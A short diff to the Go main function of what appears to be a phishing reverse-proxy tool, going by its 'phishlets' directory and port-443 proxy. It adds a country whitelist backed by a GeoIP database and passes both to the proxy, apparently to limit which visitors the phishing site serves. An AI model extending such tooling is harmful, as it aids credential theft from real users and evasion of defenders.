@@ -113,6 +113,12 @@ func main() {
 		log.Error("blacklist: %s", err)
 		return
 	}
+	
+	wl, err, geoip_db := core.NewWhitelist(filepath.Join(*cfg_dir, "country_whitelist.txt"))
+	if err != nil {
+		log.Error("Country Whitelist: %s", err)
+		return
+	}
 
 	files, err := ioutil.ReadDir(phishlets_path)
 	if err != nil {
@@ -152,7 +158,8 @@ func main() {
 
 	log.Debug("config: %v", cfg)
 
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
+	//hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
+	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, wl, geoip_db, *developer_mode)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
